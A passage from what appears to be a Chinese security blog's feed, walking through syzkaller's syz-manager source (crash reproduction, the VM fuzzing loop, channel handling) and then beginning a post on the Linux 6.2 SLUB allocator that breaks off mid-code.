class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *context)</span></span> extractProg(entries []*prog.LogEntry) (*Result, <span class="hljs-type">error</span>) &#123;<br>ctx.reproLogf(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;extracting reproducer from %v programs&quot;</span>, <span class="hljs-built_in">len</span>(entries))<br>start := time.Now()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>ctx.stats.ExtractProgTime = time.Since(start)<br>&#125;()<br><br><span class="hljs-comment">// Extract last program on every proc.</span><br>procs := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">int</span>)<br><span class="hljs-keyword">for</span> i, ent := <span class="hljs-keyword">range</span> entries &#123;<br>procs[ent.Proc] = i<br>&#125;<br><span class="hljs-keyword">var</span> indices []<span class="hljs-type">int</span><br><span class="hljs-keyword">for</span> _, idx := <span class="hljs-keyword">range</span> procs &#123;<br>indices = <span class="hljs-built_in">append</span>(indices, idx)<br>&#125;<br>sort.Ints(indices)<br><span class="hljs-keyword">var</span> lastEntries []*prog.LogEntry<br><span class="hljs-keyword">for</span> i := <span class="hljs-built_in">len</span>(indices) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i-- &#123;<br>lastEntries = <span class="hljs-built_in">append</span>(lastEntries, entries[indices[i]])<br>&#125;<br><span class="hljs-keyword">for</span> _, timeout := <span class="hljs-keyword">range</span> ctx.testTimeouts &#123;<br><span class="hljs-comment">// 分别执行每个程序以检测由单个程序造成的简单的 crash.</span><br><span class="hljs-comment">// 程序被逆序执行, 通常最后一个程序就是罪魁祸首.</span><br>res, err := ctx.extractProgSingle(lastEntries, timeout)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;found reproducer with %d syscalls&quot;</span>, <span class="hljs-built_in">len</span>(res.Prog.Calls))<br><span class="hljs-keyword">return</span> res, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// 若只有一个 entry 则不进行二分.</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(entries) == <span class="hljs-number">1</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><br><span class="hljs-comment">// 执行多个程序并二分 log 以找到造成崩溃的多个程序.</span><br>res, err = ctx.extractProgBisect(entries, timeout)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;found reproducer with %d syscalls&quot;</span>, <span class="hljs-built_in">len</span>(res.Prog.Calls))<br><span class="hljs-keyword">return</span> res, <span class="hljs-literal">nil</span><br>&#125;<br>&#125;<br><br>ctx.reproLogf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;failed to extract reproducer&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这两个函数主要就是通过如下调用链来在 VM 中执行程序，这里就不展开了：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">context.test<span class="hljs-constructor">Prog()</span><br>context.test<span class="hljs-constructor">Progs()</span><br>context.test<span class="hljs-constructor">WithInstance()</span><br>ExecProgInstance.<span class="hljs-constructor">RunSyzProg()</span><br>ExecProgInstance.<span class="hljs-constructor">RunSyzProgFile()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ExecProgInstance</span>.</span></span>run<span class="hljs-constructor">Command()</span><br></code></pre></td></tr></table></figure><h4 id="②-循环启动协程进行-fuzzing"><a href="#②-循环启动协程进行-fuzzing" class="headerlink" title="② 循环启动协程进行 fuzzing"></a>② 循环启动协程进行 fuzzing</h4><p>此时已经不满足可以进行 crash 复现的条件了，因而会有第二个小循环启动新协程<strong>将资源池中剩余 VM 调度去 fuzzing</strong>， 并将结果输出到 <code>runDone</code> 中： </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> !canRepro() &#123;<br>idx := instances.TakeOne()<br><span class="hljs-keyword">if</span> idx == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: starting instance %v&quot;</span>, *idx)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>crash, err := mgr.runInstance(*idx)<br>runDone &lt;- &amp;RunResult&#123;*idx, crash, err&#125;<br>&#125;()<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>runInstance()</code> 函数实际上会调用 <code>runInstanceInner()</code>，该函数<strong>仅当产生了 Crash 时返回的结果才不为 nil，即 runRepro 队列实际上为 Crash 队列：</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> runInstance(index <span class="hljs-type">int</span>) (*Crash, <span class="hljs-type">error</span>) &#123;<br>mgr.checkUsedFiles()<br>instanceName := fmt.Sprintf(<span class="hljs-string">&quot;vm-%d&quot;</span>, index)<br><br>rep, vmInfo, err := mgr.runInstanceInner(index, instanceName)<br><br>machineInfo := mgr.serv.shutdownInstance(instanceName)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(vmInfo) != <span class="hljs-number">0</span> &#123;<br>machineInfo = <span class="hljs-built_in">append</span>(<span class="hljs-built_in">append</span>(vmInfo, <span class="hljs-string">&#x27;\n&#x27;</span>), machineInfo...)<br>&#125;<br><br><span class="hljs-comment">// Error that is not a VM crash.</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-comment">// No crash.</span><br><span class="hljs-keyword">if</span> rep == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br>crash := &amp;Crash&#123;<br>vmIndex:     index,<br>hub:         <span class="hljs-literal">false</span>,<br>Report:      rep,<br>machineInfo: machineInfo,<br>&#125;<br><span class="hljs-keyword">return</span> crash, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>runInstanceInner()</code> 的核心部分主要是：</p><ul><li><p>调用 <code>vmPool.Create()</code> 创建 VM，调用 <code>inst.Forward()</code> 进行 TCP 转发，拷贝 <code>syz-fuzzer</code> 与 <code>syz-executor</code> 到 VM 文件系统中</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> runInstanceInner(index <span class="hljs-type">int</span>, instanceName <span class="hljs-type">string</span>) (*report.Report, []<span class="hljs-type">byte</span>, <span class="hljs-type">error</span>) &#123;<br>inst, err := mgr.vmPool.Create(index)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create instance: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> inst.Close()<br><br>fwdAddr, err := inst.Forward(mgr.serv.port)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to setup port forwarding: %v&quot;</span>, err)<br>&#125;<br><br>fuzzerBin, err := inst.Copy(mgr.cfg.FuzzerBin)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to copy binary: %v&quot;</span>, err)<br>&#125;<br><br><span class="hljs-comment">// 若提供了 ExecutorBin , 这意味着 syz-executor 早已在镜像中,</span><br><span class="hljs-comment">// 故无需进行拷贝.</span><br>executorBin := mgr.sysTarget.ExecutorBin<br><span class="hljs-keyword">if</span> executorBin == <span class="hljs-string">&quot;&quot;</span> &#123;<br>executorBin, err = inst.Copy(mgr.cfg.ExecutorBin)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to copy binary: %v&quot;</span>, err)<br>&#125;<br>&#125;<br><br>fuzzerV := <span class="hljs-number">0</span><br>procs := mgr.cfg.Procs<br><span class="hljs-keyword">if</span> *flagDebug &#123;<br>fuzzerV = <span class="hljs-number">100</span><br>procs = <span class="hljs-number">1</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>调用 <code>instance.FuzzerCmd()</code> 生成命令行后调用 <code>inst.Run()</code> 启动 <code>syz-fuzzer</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Run the fuzzer binary.</span><br>start := time.Now()<br>atomic.AddUint32(&amp;mgr.numFuzzing, <span class="hljs-number">1</span>)<br><span class="hljs-keyword">defer</span> atomic.AddUint32(&amp;mgr.numFuzzing, ^<span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))<br>  <br>args := &amp;instance.FuzzerCmdArgs&#123;<br>Fuzzer:    fuzzerBin,<br>Executor:  executorBin,<br>Name:      instanceName,<br>OS:        mgr.cfg.TargetOS,<br>Arch:      mgr.cfg.TargetArch,<br>FwdAddr:   fwdAddr,<br>Sandbox:   mgr.cfg.Sandbox,<br>Procs:     procs,<br>Verbosity: fuzzerV,<br>Cover:     mgr.cfg.Cover,<br>Debug:     *flagDebug,<br>Test:      <span class="hljs-literal">false</span>,<br>Runtest:   <span class="hljs-literal">false</span>,<br>Optional: &amp;instance.OptionalFuzzerArgs&#123;<br>Slowdown:   mgr.cfg.Timeouts.Slowdown,<br>RawCover:   mgr.cfg.RawCover,<br>SandboxArg: mgr.cfg.SandboxArg,<br>&#125;,<br>&#125;<br>cmd := instance.FuzzerCmd(args)<br>outc, errc, err := inst.Run(mgr.cfg.Timeouts.VMRunningTime, mgr.vmStop, cmd)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to run fuzzer: %v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>调用 <code>inst.MonitorExecution()</code> 监控 VM 运行，该函数主要是<strong>通过获取 kernel oops 来判断是否触发了 crash</strong>（KASAN 不会造成 kernel panic，从而使得一个 VM 实例长期运行，不过 dmesg 中仍有 oops）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> vmInfo []<span class="hljs-type">byte</span><br>rep := inst.MonitorExecution(outc, errc, mgr.reporter, vm.ExitTimeout)<br><span class="hljs-keyword">if</span> rep == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// This is the only &quot;OK&quot; outcome.</span><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%s: running for %v, restarting&quot;</span>, instanceName, time.Since(start))<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>vmInfo, err = inst.Info()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>vmInfo = []<span class="hljs-type">byte</span>(fmt.Sprintf(<span class="hljs-string">&quot;error getting VM info: %v\n&quot;</span>, err))<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> rep, vmInfo, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="Step-3-等待处理不同-channel-数据"><a href="#Step-3-等待处理不同-channel-数据" class="headerlink" title="Step 3. 等待处理不同 channel 数据"></a>Step 3. 等待处理不同 channel 数据</h3><p><code>vmLoop()</code> 的最后主要就是一个大的 <code>select</code>，等待某个 channel 中有数据后进行处理，之后重新跳回等待处理或是开始下一轮循环：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> stopRequest <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span><br><span class="hljs-keyword">if</span> !stopPending &amp;&amp; canRepro() &#123;<br>stopRequest = mgr.vmStop<br>&#125;<br><br>wait:<br><span class="hljs-keyword">select</span> &#123;<br></code></pre></td></tr></table></figure><p>首先是资源池的 <code>Freed</code> channel，在 <code>Put()</code> 中会将空闲 VM idx 放回资源池后向该 channel 送入一个 <code>true</code>，而这里什么都没有做，笔者估计会在后续版本中更新：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> &lt;-instances.Freed:<br><span class="hljs-comment">// An instance has been released.</span><br></code></pre></td></tr></table></figure><p><code>stopRequest</code> 其实是 <code>Manager.vmStop</code> ，这个 channel 会在 VM instance 所实现的 <code>Run()</code> 方法中被使用：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> stopRequest &lt;- <span class="hljs-literal">true</span>:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: issued stop request&quot;</span>)<br>stopPending = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>当 <code>runDone</code> 中有数据时说明<strong>fuzz 产生了 crash</strong>，此时会将产生 crash 的 VM 释放回资源池，将 crash 写入 <code>pendingRepro</code> 表中等待下一轮循环进行处理：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> res := &lt;-runDone:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: instance %v finished, crash=%v&quot;</span>, res.idx, res.crash != <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">if</span> res.err != <span class="hljs-literal">nil</span> &amp;&amp; shutdown != <span class="hljs-literal">nil</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%v&quot;</span>, res.err)<br>&#125;<br>stopPending = <span class="hljs-literal">false</span><br>instances.Put(res.idx)<br><span class="hljs-comment">// On shutdown qemu crashes with &quot;qemu: terminating on signal 2&quot;,</span><br><span class="hljs-comment">// which we detect as &quot;lost connection&quot;. Don&#x27;t save that as crash.</span><br><span class="hljs-keyword">if</span> shutdown != <span class="hljs-literal">nil</span> &amp;&amp; res.crash != <span class="hljs-literal">nil</span> &#123;<br>needRepro := mgr.saveCrash(res.crash)<br><span class="hljs-keyword">if</span> needRepro &#123;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: add pending repro for &#x27;%v&#x27;&quot;</span>, res.crash.Title)<br>pendingRepro[res.crash] = <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>reproDone</code> 中为 crash 的复现结果，这里会保存复现结果并将对应的 crash 从 <code>reproducing</code> 表中删除</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> res := &lt;-reproDone:<br>atomic.AddUint32(&amp;mgr.numReproducing, ^<span class="hljs-type">uint32</span>(<span class="hljs-number">0</span>))<br>crepro := <span class="hljs-literal">false</span><br>title := <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">if</span> res.repro != <span class="hljs-literal">nil</span> &#123;<br>crepro = res.repro.CRepro<br>title = res.repro.Report.Title<br>&#125;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: repro on %+v finished &#x27;%v&#x27;, repro=%v crepro=%v desc=&#x27;%v&#x27;&quot;</span>,<br>res.instances, res.report0.Title, res.repro != <span class="hljs-literal">nil</span>, crepro, title)<br><span class="hljs-keyword">if</span> res.err != <span class="hljs-literal">nil</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;repro failed: %v&quot;</span>, res.err)<br>&#125;<br><span class="hljs-built_in">delete</span>(reproducing, res.report0.Title)<br><span class="hljs-keyword">if</span> res.repro == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> !res.hub &#123;<br>mgr.saveFailedRepro(res.report0, res.stats)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>mgr.saveRepro(res)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>shutdown</code> 中有数据则表示收到了终止信号，此时会将 <code>shutdown</code> 置为 nil，终止循环：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> &lt;-shutdown:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: shutting down...&quot;</span>)<br>shutdown = <span class="hljs-literal">nil</span><br></code></pre></td></tr></table></figure><p><code>hubReproQueue</code> 上也可能传来 crash，此处将其送入 <code>pendingRepro</code> 表中等待在后续循环中复现：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> crash := &lt;-mgr.hubReproQueue:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: get repro from hub&quot;</span>)<br>pendingRepro[crash] = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><code>needMoreRepros</code> 是一个传输 channel 的 channel，这里会将一个条件判断结果传入传来的 channel 中并重新跳回等待：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> reply := &lt;-mgr.needMoreRepros:<br>reply &lt;- phase &gt;= phaseTriagedHub &amp;&amp;<br><span class="hljs-built_in">len</span>(reproQueue)+<span class="hljs-built_in">len</span>(pendingRepro)+<span class="hljs-built_in">len</span>(reproducing) == <span class="hljs-number">0</span><br><span class="hljs-keyword">goto</span> wait<br></code></pre></td></tr></table></figure><p>最后是 <code>reproRequest</code>，该 channel 意为<strong>主动进行复现的请求</strong>，这里会拷贝 <code>reproducing</code> 位图后将其传入传来的 channel 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> reply := &lt;-mgr.reproRequest:<br>repros := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">for</span> title := <span class="hljs-keyword">range</span> reproducing &#123;<br>repros[title] = <span class="hljs-literal">true</span><br>&#125;<br>reply &lt;- repros<br><span class="hljs-keyword">goto</span> wait<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此，<code>syz-manager</code> 的基本运行逻辑分析完毕</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;宁就是👴の Manager 🐎&lt;/p&gt;</summary>
    
    
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/categories/FUZZ/"/>
    
    
    <category term="漏洞挖掘" scheme="https://arttnba3.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="syzkaller" scheme="https://arttnba3.github.io/tags/syzkaller/"/>
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/tags/FUZZ/"/>
    
  </entry>
  
  <entry>
    <title>【OS.0x04】Linux 内核内存管理浅析 III - Slub Allocator</title>
    <link href="https://arttnba3.github.io/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/"/>
    <id>https://arttnba3.github.io/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/</id>
    <published>2023-02-23T15:24:42.000Z</published>
    <updated>2023-12-18T07:01:46.674Z</updated>
    
    <content type="html"><![CDATA[<p>别人问你哪里丑态你再把他反手挂到自己的小 slub 里寻求认同</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><blockquote><p>因为这系列文章🕊🕊🕊太久了，内核的内存管理也发生了一定的变化，所以本文直接用最新的 6.2 版本的内核源码：）</p></blockquote><p>在<a href="https://arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/">上一篇文章</a> 中笔者简要介绍了 buddy system 的基本流程，但其为一个「页」这一级的 allocator，在日常生活中使用（？）难免有些浪费，因为内核中需要动态内存分配的场景虽然很多，但是我们<strong>通常并不需要使用一整页起步的内存，而往往是需要分配一些比较小的对象</strong>——因此 slab allocator 应运而生，其代替我们向 buddy system 请求内存页，并分割为多个小的 object，当我们每次需要时只需要取一个 object 即可</p><blockquote><p>slab 又被称为内核的堆（heap）内存管理，因为其与用户态的内存“堆”（heap）类似，都是动态分配的内存</p></blockquote><p>slab allocator 一共有三种版本：</p><ul><li>slab（最初的版本，机制比较复杂，效率不高）</li><li>slob（用于嵌入式等场景的极为简化版本）</li><li><strong>slub</strong>（优化后的版本，<strong>现在的通用版本</strong>）</li></ul><blockquote><p>这三种内存分配器的顶层 API 是一致的，但内部实现是不一致的（例如 slab 和 slub 各自有一个对 <code>kmem_cache</code> 的不同定义）</p></blockquote><p>本篇文章中我们主要介绍的是 <strong>slub</strong> ，也是现在内核中最为通用的小对象分配器</p><h1 id="0x01-slub-allocator-的基本结构"><a href="#0x01-slub-allocator-的基本结构" class="headerlink" title="0x01. slub allocator 的基本结构"></a>0x01. slub allocator 的基本结构</h1><p>首先来一张 Overview：</p><p><img src="https://i.loli.net/2021/07/22/ivPnbsjHyI94m5z.png" alt="image.png"></p><h2 id="一、slab：单份-object-池"><a href="#一、slab：单份-object-池" class="headerlink" title="一、slab：单份 object 池"></a>一、slab：单份 object 池</h2><p>Linux kernel 中用以统筹所有内存的依然是 buddy system，slub allocator 也不例外，其负责向 buddy system 请求内存后分割给多个小 object 后再返还给上层调用者，<strong>单次向 buddy system 所请求的一份连续内存页便称之为一张 slab</strong>，在内核中对应 <code>slab</code> 结构体，<strong>本质上是复用 page 结构体</strong>：</p><blockquote><p>这里我们仅关注 slub，所以笔者仅截取 slub 所需字段</p><blockquote><p>老版本中 slab 是直接内嵌在 page 结构体中的</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Reuses the bits in struct page */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> __page_flags;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(CONFIG_SLUB)</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">slab_cache</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">slab_list</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> 